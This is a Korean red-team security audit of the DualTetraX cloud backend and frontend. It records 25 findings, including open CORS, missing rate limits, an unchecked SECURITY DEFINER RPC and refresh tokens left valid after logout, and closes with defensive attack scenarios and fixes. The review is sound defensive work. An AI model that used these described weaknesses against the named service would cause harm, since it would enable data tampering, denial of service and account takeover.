# DualTetraX Cloud Services - Red Team 보안 검토 보고서

**버전**: 1.0
**작성일**: 2026-02-08
**검토 대상**: DualTetraX Cloud Services (Backend API, Frontend, Database, Infrastructure)
**검토자**: Red Team Security Audit
**분류**: Confidential

---

## 1. 요약 (Executive Summary)

### 1.1 전체 보안 등급

| 등급 | 개수 | 비율 |
|------|------|------|
| **Critical** | 4 | 16% |
| **High** | 7 | 28% |
| **Medium** | 9 | 36% |
| **Low** | 5 | 20% |
| **총계** | **25** | 100% |

### 1.2 핵심 위험 요약

1. **CORS 정책 전면 개방 (`Access-Control-Allow-Origin: *`)**: 백엔드 `vercel.json`에서 모든 도메인의 API 접근을 허용하고 있어, CSRF 및 악성 사이트에서의 인증된 요청이 가능하다. 인증 토큰이 포함된 요청이 어떤 출처에서든 수행될 수 있는 Critical 수준의 취약점이다.
2. **Rate Limiting 부재**: 모든 API 엔드포인트에 Rate Limiting이 없어 Brute Force 공격, 세션 대량 업로드를 통한 DB 자원 고갈, 서비스 거부(DoS) 공격에 노출되어 있다.
3. **`service_role_key` 기반 RLS 우회**: 세션 업로드(`upload.ts`)에서 `supabaseAdmin` 클라이언트를 사용하여 RLS를 우회하는데, 사용자 입력의 `user_id`를 `authenticate()`에서 추출한 값으로 설정하지만, 다른 사용자의 `device_id`를 사용한 데이터 삽입 시나리오에 대한 방어가 불완전하다.
4. **Health/Ping 엔드포인트의 환경 정보 노출**: `/api/health`와 `/api/ping`이 인증 없이 내부 서비스 상태와 환경 변수 존재 여부를 노출하여 정찰(reconnaissance) 공격에 활용될 수 있다.
5. **프론트엔드 CSP 헤더 부재 및 `dangerouslySetInnerHTML` 사용**: Content Security Policy가 설정되지 않았고, `layout.tsx`에서 인라인 스크립트를 `dangerouslySetInnerHTML`로 주입하고 있어 XSS 방어 체계가 미비하다.

---

## 2. 인증/인가 보안 분석

### 2.1 Supabase Auth JWT 검증 방식

**파일**: `/backend/lib/auth.ts` (라인 44-72)

**현재 구현**:
```typescript
// auth.ts:62
const { data, error } = await supabaseAdmin.auth.getUser(token);
```

**분석**:
- `supabaseAdmin.auth.getUser(token)`은 Supabase 서버에 네트워크 요청을 보내 토큰을 검증한다. 이는 매 API 호출마다 Supabase Auth 서버로 왕복 요청이 발생하며, Supabase 서비스 장애 시 전체 인증 체계가 마비된다.
- JWT의 로컬 서명 검증(JWKS 기반)을 수행하지 않으므로, 토큰의 `exp` 클레임 검증이 Supabase 서버에 전적으로 의존한다.
- **[Medium] SEC-AUTH-01**: 토큰 검증이 외부 서비스에 완전 의존하므로, Supabase Auth 서버 지연/장애 시 cascading failure가 발생한다. JWT를 로컬에서 JWKS 공개키로 서명 검증한 후, Supabase는 사용자 정보 조회에만 사용하는 것을 권장한다.

### 2.2 Redis 블랙리스트 우회 가능성

**파일**: `/backend/lib/auth.ts` (라인 23-25), `/backend/lib/redis.ts`

**현재 구현**:
```typescript
// auth.ts:23-25 - 해시 절단
export function hashToken(token: string): string {
  return createHash('sha256').update(token).digest('hex').substring(0, 32);
}
```

**취약점 분석**:

- **[Medium] SEC-AUTH-02**: SHA-256 해시의 256비트 중 128비트(32 hex chars)만 사용한다. 이론적 충돌 가능성이 증가하며, 의도적인 해시 충돌을 통해 다른 사용자의 토큰을 블랙리스트에 넣는 공격(DoS)이 가능할 수 있다. 전체 64자 해시를 사용할 것을 권장한다.

- **[High] SEC-AUTH-03**: Redis(Upstash) 서버가 다운되면 `isTokenBlacklisted()` 호출이 예외를 발생시킬 수 있으나, `auth.ts`의 `authenticate()` 함수에서 이에 대한 에러 핸들링이 없다. Redis 장애 시 모든 요청이 500 에러를 반환하거나, 반대로 블랙리스트 확인을 건너뛰어 로그아웃된 토큰이 재사용될 수 있다.

  ```typescript
  // auth.ts:55-58 - Redis 장애 시 에러 핸들링 없음
  const tokenHash = hashToken(token);
  if (await isTokenBlacklisted(tokenHash)) {  // Redis 다운 시 예외 발생
    res.status(401).json({ error: 'Token has been revoked' });
    return null;
  }
  ```

### 2.3 소셜 로그인 (OAuth) 보안 고려사항

**현재 상태**: 요구사항(FR-UM-002)에는 Google, Apple Sign-In이 필수로 명시되어 있으나, 아직 구현되지 않았다.

**[Medium] SEC-AUTH-04**: OAuth 구현 시 고려사항:
- OAuth state parameter 검증 필수 (CSRF 방지)
- `id_token` 검증 시 `aud` 및 `iss` 클레임 반드시 검증
- Apple Sign-In의 경우 `email` 필드가 첫 로그인 시에만 제공되므로, 이후 재인증 시 이메일 누락 처리 필요
- OAuth redirect URI whitelist를 엄격하게 관리 (open redirect 방지)

### 2.4 세션 관리 취약점

- **[High] SEC-AUTH-05**: 로그아웃 시 Redis에 토큰을 블랙리스트하지만, Supabase의 Refresh Token은 무효화하지 않는다. `logout.ts`(라인 17)에서 `blacklistToken()`만 호출하고, `supabase.auth.admin.signOut(userId)`를 호출하지 않으므로, 클라이언트에 캐시된 Refresh Token으로 새 Access Token을 발급받을 수 있다.

  ```typescript
  // logout.ts:17 - Access Token만 블랙리스트, Refresh Token 미처리
  await blacklistToken(tokenHash, exp);
  // Missing: await supabaseAdmin.auth.admin.signOut(user.id);
  ```

- **[Low] SEC-AUTH-06**: 동시 세션 관리 미구현. 한 계정에서 무제한 디바이스/브라우저에서 동시 로그인이 가능하며, 의심스러운 동시 접속 탐지 기능이 없다.

### 2.5 관리자(role) 접근 제어 분석

**현재 상태**: `profiles` 테이블에 `role TEXT NOT NULL DEFAULT 'user' CHECK (role IN ('user', 'admin'))` 필드가 있으나, 관리자 API 엔드포인트는 아직 구현되지 않았다.

**[High] SEC-AUTH-07**: 현재 구현된 API 중 어디에서도 관리자 역할 확인을 수행하지 않는다. `authenticate()` 함수(auth.ts)가 반환하는 `AuthUser`에 `role` 필드가 포함되지 않아, 관리자 기능 구현 시 별도의 역할 확인 로직을 추가하지 않으면 일반 사용자가 관리자 API에 접근할 수 있다.

```typescript
// auth.ts:6-9 - role 필드 미포함
export interface AuthUser {
  id: string;
  email: string;
  // Missing: role: 'user' | 'admin';
}
```

---

## 3. API 보안 분석

### 3.1 엔드포인트별 취약점 분석

#### 3.1.1 `/api/ping` - 환경 정보 노출

**파일**: `/backend/api/ping.ts` (라인 1-13)

**[Critical] SEC-API-01**: 인증 없이 환경 변수 존재 여부를 노출한다.

```typescript
// ping.ts:8-11
env_check: {
  supabase_url: !!process.env.SUPABASE_URL,
  supabase_key: !!process.env.SUPABASE_SERVICE_ROLE_KEY,
  redis_url: !!process.env.UPSTASH_REDIS_REST_URL,
}
```

공격자가 환경 변수 설정 상태를 파악하여, 설정되지 않은 서비스를 대상으로 한 공격 벡터를 식별할 수 있다. 프로덕션 환경에서는 이 엔드포인트를 제거하거나 인증을 필수로 설정해야 한다.

#### 3.1.2 `/api/health` - 내부 서비스 상태 및 에러 메시지 노출

**파일**: `/backend/api/health.ts` (라인 1-57)

**[High] SEC-API-02**: 인증 없이 데이터베이스와 Redis의 연결 상태, 에러 메시지를 노출한다.

```typescript
// health.ts:50-55
...((!dbOk || !redisOk) && {
  errors: {
    ...(dbError && { database: dbError }),    // DB 에러 메시지 전체 노출
    ...(redisError && { redis: redisError }), // Redis 에러 메시지 전체 노출
  },
}),
```

에러 메시지에 호스트명, 포트, 내부 주소 등의 민감 정보가 포함될 수 있다. 또한 `environment` 필드로 운영 환경(production/development)까지 노출된다.

#### 3.1.3 `/api/sessions/upload` - 세션 업로드 보안

**파일**: `/backend/api/sessions/upload.ts`

**[High] SEC-API-03**: 배치 업로드 시 `supabaseAdmin`(RLS 우회) 클라이언트를 사용한다.

```typescript
// upload.ts:38-64 - supabaseAdmin으로 RLS 우회하여 insert
const { data: inserted, error: insertError } = await supabaseAdmin
  .from('usage_sessions')
  .upsert(...)
```

디바이스 소유권 확인(라인 19-27)은 RLS가 적용된 `createUserClient`로 수행하지만, 실제 데이터 삽입은 `supabaseAdmin`으로 수행한다. 공격자가 소유한 디바이스의 ID로 다른 사용자의 `user_id`를 가진 세션 데이터를 삽입하는 것은 `user.id`를 서버에서 설정하므로 방지되지만, 다음 위험이 존재한다:

- `device_id`에 대한 소유권 확인 후 `supabaseAdmin`으로 삽입할 때, TOCTOU(Time-of-Check-Time-of-Use) 경쟁 조건이 발생할 수 있다.
- 배치 크기 제한이 100개(Zod 스키마)이지만, 각 세션에 대한 `battery_samples` 배열의 크기 제한이 없어 메모리 및 DB 자원 고갈이 가능하다.

**[Medium] SEC-API-04**: `battery_samples` 배열에 대한 크기 제한 부재.

```typescript
// validate.ts:75
battery_samples: z.array(BatterySampleSchema).optional().default([]),
// 최대 크기 제한 없음 - 수천/수만 개의 샘플 전송 가능
```

세션당 8분(480초)의 제한이 있으므로 현실적인 배터리 샘플은 최대 ~480개(1초 간격)이지만, 악의적인 클라이언트가 수만 개의 샘플을 전송하여 DB를 과부하시킬 수 있다.

#### 3.1.4 `/api/devices` - 디바이스 등록

**파일**: `/backend/api/devices/index.ts`

**[Medium] SEC-API-05**: 디바이스 등록 시 `serial_number` 검증이 형식 패턴 없이 최소 1자, 최대 100자만 확인한다.

```typescript
// validate.ts:46
serial_number: z.string().min(1).max(100),
```

임의의 문자열로 디바이스를 등록할 수 있어, 추후 다른 사용자의 실제 디바이스 시리얼 번호가 이미 등록된 상태(409 Conflict)가 되어 정상 사용을 방해할 수 있다.

### 3.2 입력 검증 (Zod 스키마) 완성도

**파일**: `/backend/lib/validate.ts`

**[Medium] SEC-API-06**: `device_mode` 필드에 유효한 값 범위 검증이 없다.

```typescript
// validate.ts:60
device_mode: z.number().int(),  // 0x01~0x04, 0x11~0x14, 0x21만 유효하지만 제한 없음
```

유효한 device_mode 값은 `0x01, 0x02, 0x03, 0x04, 0x11, 0x12, 0x13, 0x14, 0x21`이지만, 현재 스키마에서는 임의의 정수를 허용한다. 이는 통계 집계 시 잘못된 데이터를 생성할 수 있다.

**[Low] SEC-API-07**: `termination_reason` 필드의 유효값 검증 부재.

```typescript
// validate.ts:68
termination_reason: z.number().int().optional().nullable(),
// 0~9, 255만 유효하지만 제한 없음
```

### 3.3 Rate Limiting 부재

**[Critical] SEC-API-08**: 모든 API 엔드포인트에 Rate Limiting이 없다.

설계 문서(02-system-design.md, 라인 479)에서 "Phase 2에서 적용 (초당 100 요청/IP)"으로 명시하고 있으나, Phase 1에서도 최소한의 Rate Limiting이 필요하다.

**위험 시나리오**:
- `/api/auth/logout`에 대한 반복 호출로 Redis에 대량의 블랙리스트 키 생성
- `/api/sessions/upload`에 대한 대량 요청으로 DB 쓰기 과부하
- `/api/stats/range`에 넓은 날짜 범위를 반복 조회하여 DB 읽기 과부하
- Brute Force 로그인 시도 (Supabase Auth 자체 Rate Limiting에만 의존)

### 3.4 CORS 설정

**파일**: `/backend/vercel.json` (라인 7-15)

**[Critical] SEC-API-09**: CORS 정책이 전면 개방되어 있다.

```json
{ "key": "Access-Control-Allow-Origin", "value": "*" }
```

이 설정은 어떤 웹사이트에서든 DualTetraX API에 인증된 요청을 보낼 수 있게 한다. 악성 웹사이트가 사용자의 브라우저에서 저장된 Supabase 세션 토큰을 이용하여 API를 호출할 수 있다.

**권장 수정**:
```json
{ "key": "Access-Control-Allow-Origin", "value": "https://qp-dualtetrax-web.vercel.app" }
```

또는 동적 Origin 검증 미들웨어를 구현해야 한다.

### 3.5 에러 메시지 정보 노출

**[Medium] SEC-API-10**: 여러 엔드포인트에서 Supabase 에러 메시지를 그대로 클라이언트에 반환한다.

```typescript
// devices/index.ts:21
if (error) return res.status(500).json({ error: error.message });

// sessions/index.ts:37
if (error) return res.status(500).json({ error: error.message });
```

Supabase 에러 메시지에는 테이블명, 컬럼명, 제약 조건명 등 DB 스키마 정보가 포함될 수 있다. 프로덕션에서는 제네릭 에러 메시지를 반환하고, 상세 에러는 서버 로그에만 기록해야 한다.

---

## 4. 데이터베이스 보안 분석

### 4.1 RLS 정책 우회 가능성

**파일**: `/doc/03-schema.sql`

**[High] SEC-DB-01**: `supabaseAdmin` 클라이언트가 `service_role_key`를 사용하여 RLS를 완전히 우회한다.

현재 다음 작업에서 `supabaseAdmin`이 사용된다:
- `upload.ts`: 세션 삽입 (`usage_sessions`, `battery_samples`)
- `upload.ts`: 디바이스 통계 업데이트 (`devices`)
- `upload.ts`: 일별 통계 집계 RPC 호출
- `health.ts`: 헬스 체크 쿼리

`supabaseAdmin`은 `service_role_key`를 사용하므로 모든 RLS 정책을 우회한다. 만약 `upload.ts`의 비즈니스 로직에 버그가 있으면, 다른 사용자의 데이터를 수정/삽입할 수 있다.

**[Medium] SEC-DB-02**: `daily_statistics` 테이블의 INSERT/UPDATE에 RLS 정책이 없다.

```sql
-- 03-schema.sql:248
-- INSERT/UPDATE는 service_role_key로만 (RLS bypass)
```

이는 의도된 설계이지만, `service_role_key`가 유출될 경우 임의의 통계 데이터를 삽입할 수 있다.

### 4.2 SQL Injection 위험

**[Low] SEC-DB-03**: Supabase JS SDK를 사용하여 파라미터화된 쿼리가 수행되므로, 직접적인 SQL Injection 위험은 낮다. 그러나 `aggregate_daily_stats` RPC 함수가 `SECURITY DEFINER`로 정의되어 있어, 이 함수를 직접 호출할 수 있는 경우 권한 상승이 가능하다.

```sql
-- 03-schema.sql:371
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

`SECURITY DEFINER` 함수는 함수를 생성한 사용자(보통 superuser)의 권한으로 실행된다. RLS 정책이 적용되지 않으므로, 인증된 사용자가 Supabase Client에서 직접 `rpc('aggregate_daily_stats', ...)`를 호출하면 타인의 `user_id`로 통계를 생성/수정할 수 있다.

**[High] SEC-DB-04**: `aggregate_daily_stats` 함수에 파라미터 검증이 없다.

```sql
-- 03-schema.sql:296-371
CREATE OR REPLACE FUNCTION aggregate_daily_stats(
  p_user_id UUID,
  p_device_id UUID,
  p_date DATE
)
```

이 함수는 `p_user_id`가 호출자 자신인지 확인하지 않는다. 프론트엔드 Supabase 클라이언트(anon key 사용)에서 직접 이 RPC를 호출하면, 임의의 `user_id`와 `device_id`로 통계를 조작할 수 있다.

### 4.3 데이터 무결성 (usage_sessions UUID PK)

**[Medium] SEC-DB-05**: `usage_sessions`의 PK가 클라이언트에서 생성한 UUID이다.

```sql
-- 03-schema.sql:77
id UUID PRIMARY KEY,  -- 앱 UUID = 중복 제거 키
```

클라이언트가 UUID를 제어하므로:
- 의도적으로 다른 사용자의 세션 ID와 동일한 UUID를 사용하여 `ON CONFLICT DO NOTHING`으로 해당 세션 업로드를 방해할 수 있다 (가능성은 매우 낮으나 이론적으로 존재).
- 예측 가능한 UUID(v1 등)를 사용하면 세션 존재 여부를 추측할 수 있다.

### 4.4 민감 데이터(PII) 보호

**[Medium] SEC-DB-06**: `profiles` 테이블에 평문으로 PII가 저장된다.

```sql
-- 03-schema.sql:37-47
CREATE TABLE profiles (
  email TEXT NOT NULL,
  name TEXT,
  gender TEXT,
  date_of_birth DATE,
  ...
);
```

`email`, `name`, `date_of_birth`, `gender`는 GDPR에서 PII로 분류되며, 요구사항(FR-PR-006)에서도 "PII 분리 저장 (민감 데이터 암호화)"를 명시하고 있으나 현재 구현에는 암호화가 없다.

**[Medium] SEC-DB-07**: `consent_records` 테이블에 `ip_address`가 평문 저장된다.

```sql
-- 04-schema-phase1-additions.sql:19
ip_address TEXT,
```

IP 주소는 GDPR에서 개인 데이터로 분류된다. 해싱하거나 암호화하여 저장해야 한다.

### 4.5 service_role_key 노출 위험

**[Critical] SEC-DB-08**: `service_role_key`가 유출되면 전체 데이터베이스에 무제한 접근이 가능하다.

현재 `service_role_key`는 Vercel 환경 변수에만 저장되어 있으나:
- Vercel 대시보드 접근 권한이 있는 모든 팀 멤버가 확인 가능
- Vercel Function의 런타임 에러로 인해 환경 변수가 로그에 노출될 가능성
- `/api/health`에서 `service_role_key`를 사용하여 DB 쿼리를 수행하는데, 이 엔드포인트는 인증이 필요하지 않음

---

## 5. 인프라 보안 분석

### 5.1 Vercel 환경 변수 관리

**파일**: `/backend/lib/supabase.ts`, `/backend/lib/redis.ts`

**[Low] SEC-INF-01**: 환경 변수 줄바꿈 이슈에 대한 `.trim()` 워크어라운드가 적용되어 있다.

```typescript
// supabase.ts:3-5
const SUPABASE_URL = (process.env.SUPABASE_URL || '').trim();
const SUPABASE_SERVICE_ROLE_KEY = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();
```

이는 Vercel 대시보드에서 환경 변수 복사/붙여넣기 시 발생하는 문제에 대한 워크어라운드이다. 근본적인 문제 해결이 아닌 임시 조치이며, 환경 변수 관리 프로세스를 정비해야 한다.

### 5.2 Upstash Redis REST API 보안

**[Medium] SEC-INF-02**: Upstash Redis는 REST API 기반으로, 모든 요청이 HTTPS를 통해 전송된다. 그러나 `UPSTASH_REDIS_REST_TOKEN`이 유출되면 Redis 인스턴스에 대한 전체 읽기/쓰기 접근이 가능하다.

공격자가 Redis 토큰을 획득하면:
- 블랙리스트된 토큰을 삭제하여 로그아웃된 세션을 복활시킬 수 있다
- 대량의 키를 생성하여 Redis 메모리를 고갈시킬 수 있다
- 향후 Redis에 캐시되는 민감 데이터를 탈취할 수 있다

### 5.3 Supabase 설정 보안

**[Medium] SEC-INF-03**: Supabase `anon_key`가 프론트엔드에 노출된다 (`NEXT_PUBLIC_SUPABASE_ANON_KEY`). 이는 설계상 의도된 것이지만, `anon_key`를 사용하여 다음이 가능하다:
- Supabase Auth API 직접 호출 (회원가입, 로그인, 비밀번호 재설정)
- RLS가 허용하는 범위 내에서 DB 직접 쿼리 (PostgREST API)
- `aggregate_daily_stats` RPC 직접 호출 (SEC-DB-04 참조)
- Storage API 접근 (설정에 따라)

`anon_key`는 공개키로 취급되어야 하며, RLS 정책이 이에 대한 방어선이 되어야 한다.

### 5.4 Frontend - Backend 통신 보안

**파일**: `/frontend/src/lib/api.ts`

**[Low] SEC-INF-04**: API URL이 하드코딩되어 있다.

```typescript
// api.ts:1
const API_URL = process.env.NEXT_PUBLIC_API_URL || "https://qp-dualtetrax-api.vercel.app";
```

환경 변수가 설정되지 않은 경우 프로덕션 URL이 기본값으로 사용된다. 개발 환경에서 실수로 프로덕션 API를 호출할 수 있다.

### 5.5 환경 분리 (dev/staging/prod)

**[High] SEC-INF-05**: 환경 분리가 이루어지지 않았다.

- `vercel.json`에 환경별 설정이 없다
- 동일한 CORS 정책이 모든 환경에 적용된다
- 개발/프로덕션 Supabase 인스턴스 분리에 대한 언급이 없다
- `NODE_ENV`에 따른 동작 차이가 없다 (에러 상세 노출 등)

---

## 6. 데이터 동기화 보안

### 6.1 BLE - App - Server 데이터 무결성

**[Medium] SEC-SYNC-01**: BLE에서 앱으로 전송된 데이터의 무결성 검증이 서버 측에서 수행되지 않는다.

서버는 앱에서 전송하는 세션 데이터를 그대로 신뢰한다. 공격자가 모바일 앱을 리버스 엔지니어링하거나 API를 직접 호출하여 조작된 세션 데이터를 업로드할 수 있다:
- 비현실적인 `working_duration` (예: 999999초)
- `completion_percent`를 항상 100으로 설정
- 미래 시간의 `start_time`

### 6.2 UUID 중복 제거의 보안 함의

**[Low] SEC-SYNC-02**: `ON CONFLICT (id) DO NOTHING` 전략은 첫 번째 삽입만 유효하다.

이 설계는 동일 세션의 중복 업로드를 방지하지만, 한번 삽입된 세션 데이터는 수정할 수 없다. 만약 앱이 잘못된 데이터를 전송하면 수정할 방법이 없다 (DELETE API가 Phase 1에 없음).

### 6.3 배치 업로드 악용 시나리오

**[High] SEC-SYNC-03**: 세션 업로드 루프에서 개별 세션 처리 실패 시 에러 카운트만 증가하고 계속 진행된다.

```typescript
// upload.ts:67-70
if (insertError) {
  errors++;
  continue;
}
```

공격자가 100개 세션 배치에 99개의 유효한 세션과 1개의 악의적 세션을 섞어 보내면, 악의적 세션만 실패하고 나머지는 삽입된다. 부분 실패에 대한 트랜잭션 롤백이 없다.

### 6.4 데이터 변조 가능성

**[Medium] SEC-SYNC-04**: `total_sessions` 카운트가 race condition에 취약하다.

```typescript
// upload.ts:99-111
const { data: currentDevice } = await supabaseAdmin
  .from('devices')
  .select('total_sessions')
  .eq('id', body.device_id)
  .single();

await supabaseAdmin
  .from('devices')
  .update({
    total_sessions: (currentDevice?.total_sessions || 0) + uploaded,
  })
  .eq('id', body.device_id);
```

Read-then-Write 패턴이 atomic하지 않아, 동시 업로드 시 `total_sessions` 값이 부정확해질 수 있다. SQL의 `SET total_sessions = total_sessions + $1`을 사용해야 한다.

---

## 7. OTA 펌웨어 업데이트 보안

### 7.1 펌웨어 바이너리 무결성 검증

**[Critical] SEC-OTA-01**: OTA 업데이트 시스템이 아직 구현되지 않았으나, 설계 문서에 펌웨어 바이너리의 서명 검증에 대한 언급이 없다.

`firmware_versions` 테이블에 체크섬/서명 컬럼이 없다:
```sql
-- 03-schema.sql:164-172
CREATE TABLE firmware_versions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  version TEXT NOT NULL UNIQUE,
  version_code INTEGER NOT NULL UNIQUE,
  changelog TEXT,
  is_active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
  -- Missing: checksum TEXT, signature TEXT, download_url TEXT, file_size BIGINT
);
```

구현 시 반드시 필요한 항목:
- SHA-256 체크섬 저장 및 다운로드 후 검증
- 코드 사이닝 (공개키 기반 서명 검증)
- 펌웨어 바이너리 크기 제한 및 검증

### 7.2 펌웨어 다운로드 URL 보안

**[High] SEC-OTA-02**: 설계 문서에서 S3에 펌웨어 바이너리를 저장하고 다운로드 URL을 제공하는 것으로 계획되어 있으나, pre-signed URL의 만료 시간, 접근 제어에 대한 상세 설계가 없다.

**권장사항**:
- Pre-signed URL은 최대 5분 유효
- 다운로드 횟수 제한
- 디바이스 인증 후에만 URL 발급
- CDN을 통한 배포 시 서명 검증

### 7.3 롤백 공격 방지

**[High] SEC-OTA-03**: 펌웨어 다운그레이드 방지 메커니즘에 대한 설계가 없다.

`version_code INTEGER NOT NULL UNIQUE` 필드가 있으나, 서버 API에서 현재 디바이스 펌웨어 버전보다 높은 버전만 제공하는 로직이 필요하다. 그렇지 않으면 공격자가 취약점이 있는 이전 버전의 펌웨어를 디바이스에 설치하여 보안 패치를 무력화할 수 있다.

### 7.4 Man-in-the-Middle 위험

**[Medium] SEC-OTA-04**: BLE OTA 업데이트는 모바일 앱을 통해 수행된다.

- 서버 - 앱 간: HTTPS로 보호됨
- 앱 - 디바이스 간: BLE 통신의 암호화 수준에 의존 (BLE 4.2+ Just Works 페어링의 경우 MITM에 취약)

BLE OTA 전송 시 펌웨어 바이너리의 무결성 검증이 ESP32 디바이스 측에서도 수행되어야 한다 (Secure Boot, Flash Encryption).

---

## 8. 프론트엔드 보안 분석

### 8.1 XSS 취약점

**파일**: `/frontend/src/app/layout.tsx` (라인 21-31)

**[Medium] SEC-FE-01**: `dangerouslySetInnerHTML`로 인라인 스크립트가 주입된다.

```tsx
// layout.tsx:21-31
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var stored = localStorage.getItem('theme');
        ...
      })();
    `,
  }}
/>
```

현재 이 스크립트는 하드코딩되어 있어 직접적인 XSS 위험은 낮지만, `dangerouslySetInnerHTML` 사용은 CSP nonce/hash 정책과 충돌하며, 향후 동적 콘텐츠 삽입 시 XSS 벡터가 될 수 있다.

**[Low] SEC-FE-02**: 사용자 입력 데이터(디바이스 시리얼 번호, 모델명 등)가 React JSX에서 `{}`로 렌더링되어 React의 기본 이스케이핑이 적용된다. 직접적인 XSS 위험은 낮다.

### 8.2 CSRF 보호

**[High] SEC-FE-03**: CSRF 보호 메커니즘이 없다.

- Backend API는 `Authorization: Bearer` 헤더로 인증하므로, 브라우저의 자동 쿠키 첨부에 의한 전통적인 CSRF는 발생하지 않는다.
- **그러나** CORS가 `*`로 설정되어 있으므로 (SEC-API-09), 악성 사이트에서 JavaScript로 `fetch()`를 호출할 때 `Authorization` 헤더를 포함할 수 있다. 만약 악성 사이트가 Supabase 세션 토큰에 접근할 수 있다면 (localStorage에 저장됨), 완전한 인증 우회가 가능하다.

실제 공격 시나리오:
1. 악성 사이트가 사용자를 유인
2. Supabase의 `sb-<project-ref>-auth-token` localStorage 키에서 토큰 추출 시도
3. CORS가 `*`이므로 API 호출 가능
4. (단, Same-Origin Policy에 의해 타 도메인의 localStorage 직접 접근은 불가. XSS와 결합 시 위험)

### 8.3 민감 데이터 클라이언트 저장

**[Medium] SEC-FE-04**: Supabase Auth가 `localStorage`에 세션 토큰을 저장한다.

Supabase SSR 패키지(`@supabase/ssr`)를 사용하여 쿠키 기반 세션 관리를 하고 있으나, 클라이언트 컴포넌트에서 `supabase.auth.getSession()`을 호출하여 `access_token`을 추출하고 이를 API 호출에 사용한다:

```typescript
// dashboard/page.tsx:24-25
const { data: { session } } = await supabase.auth.getSession();
const token = session.access_token;
```

XSS 공격이 성공하면 이 토큰이 탈취될 수 있다.

### 8.4 CSP 헤더

**[High] SEC-FE-05**: Content Security Policy 헤더가 설정되지 않았다.

`next.config.mjs`가 비어 있고, `vercel.json`에도 CSP 헤더가 없다:

```javascript
// next.config.mjs
const nextConfig = {};
export default nextConfig;
```

CSP 헤더가 없으면:
- 임의의 외부 스크립트 로딩이 가능
- 인라인 스크립트 실행이 가능
- `eval()` 사용이 가능
- 데이터 탈취를 위한 외부 서버 접속이 가능

### 8.5 의존성 취약점

**[Low] SEC-FE-06**: `recharts` 라이브러리 사용. 차트 라이브러리는 SVG 렌더링에 사용되며, 사용자 입력 데이터를 기반으로 SVG를 생성한다. Recharts는 데이터를 이스케이핑하므로 직접적인 위험은 낮지만, 정기적인 의존성 감사(`npm audit`)가 필요하다.

---

## 9. GDPR/개인정보 보안

### 9.1 데이터 최소화 원칙 준수

**[Medium] SEC-GDPR-01**: 필요 이상의 개인정보를 수집하고 있다.

- `profiles.gender` - 뷰티 디바이스 사용 통계에 필수적인지 재검토 필요
- `profiles.date_of_birth` - 연령대(age_range)만 저장하는 것이 데이터 최소화 원칙에 부합
- `consent_records.ip_address` - 동의 입증에 필요하나 별도 암호화 필요
- `consent_records.user_agent` - 브라우저 핑거프린팅에 악용될 수 있는 상세 정보

### 9.2 동의 관리 보안

**[Medium] SEC-GDPR-02**: 동의 기록(`consent_records`)의 DELETE RLS 정책이 없어, 사용자가 직접 동의 이력을 삭제할 수 없지만, 이는 법적 요구사항(동의 이력 보존)과 충돌할 수 있다. 반면에 RLS에 DELETE 정책이 없다는 것은 `service_role`만 삭제할 수 있다는 뜻으로, 이는 적절하다.

그러나 동의 철회 시 `consented = false`인 새 레코드를 추가하는 방식이므로, 최신 동의 상태를 확인하려면 `consent_type`별로 가장 최근 레코드를 조회해야 한다. 이 로직에 대한 서버 측 API가 아직 구현되지 않았다.

### 9.3 데이터 삭제 완전성

**[High] SEC-GDPR-03**: GDPR Right to Erasure(삭제권)를 위한 계정 삭제 API가 구현되지 않았다.

DB 스키마에는 `ON DELETE CASCADE`가 설정되어 있어 `profiles` 삭제 시 관련 데이터가 연쇄 삭제되지만:
- 계정 삭제 API 엔드포인트가 없다
- `auth.users` 삭제 트리거가 `profiles`를 CASCADE 삭제하는지 확인 필요
- Redis에 캐시된 데이터는 별도 삭제 필요
- Vercel/Supabase 로그에 남은 PII는 별도 처리 필요
- 30일 유예 기간 (요구사항 FR-PR-004) 미구현

### 9.4 데이터 이동성 보안

**[Low] SEC-GDPR-04**: GDPR Data Portability (데이터 이동권)를 위한 데이터 내보내기 API가 구현되지 않았다. Phase 2에서 `/api/sessions/export` (CSV)로 계획되어 있으나, 데이터 내보내기 시 접근 제어와 rate limiting이 특히 중요하다.

---

## 10. 위협 시나리오 (Attack Scenarios)

### 10.1 시나리오 1: 대량 세션 업로드를 통한 서비스 거부 (DoS)

**공격 벡터**:
1. 공격자가 유효한 계정으로 로그인
2. 정상적으로 디바이스 1개 등록
3. `/api/sessions/upload`에 100개 세션 x 수만 개 `battery_samples` 반복 전송
4. Rate Limiting이 없으므로 초당 수십 회 호출 가능

**영향도**: **High** - DB 쓰기 과부하, Supabase 무료/프로 플랜의 사용량 한도 초과, 다른 사용자의 서비스 불가

**발생 가능성**: **High** - 유효한 계정만 있으면 공격 가능

**대응 방안**:
- `battery_samples` 배열 크기 제한 추가 (최대 500개)
- IP 기반 Rate Limiting 도입 (예: 분당 10회 업로드)
- 단일 요청 본문 크기 제한 (Vercel 기본 4.5MB)
- `working_duration` 현실성 검증 (최대 600초 = 10분)

### 10.2 시나리오 2: 시리얼 번호 선점을 통한 정상 사용자 방해

**공격 벡터**:
1. 공격자가 DualTetraX 시리얼 번호 패턴을 파악 (예: DT-2026-XXX)
2. 대량의 시리얼 번호를 미리 등록 (`POST /api/devices`)
3. 실제 제품 구매자가 자신의 디바이스를 등록하려 하면 409 Conflict 발생

**영향도**: **Medium** - 정상 사용자의 디바이스 등록 방해

**발생 가능성**: **Medium** - 시리얼 번호 패턴이 예측 가능한 경우

**대응 방안**:
- 시리얼 번호 형식 검증 (정규식 패턴, 체크 디지트)
- 디바이스 등록 시 BLE 연결 인증 또는 물리적 확인 절차
- 디바이스당 등록 횟수 제한
- 관리자가 잘못된 등록을 취소할 수 있는 기능

### 10.3 시나리오 3: 로그아웃 우회를 통한 세션 하이재킹

**공격 벡터**:
1. 공격자가 피해자의 Access Token을 탈취 (XSS, 네트워크 스니핑 등)
2. 피해자가 로그아웃 수행 (Access Token이 Redis 블랙리스트에 추가)
3. 공격자가 탈취한 Access Token의 `refresh_token`으로 Supabase Auth에 직접 요청
4. 새로운 Access Token 발급 (블랙리스트에 없음)
5. 새 토큰으로 API 접근 지속

**영향도**: **High** - 완전한 계정 탈취

**발생 가능성**: **Medium** - Access Token 탈취가 선행 조건

**대응 방안**:
- 로그아웃 시 `supabaseAdmin.auth.admin.signOut(userId)` 호출로 Refresh Token 무효화
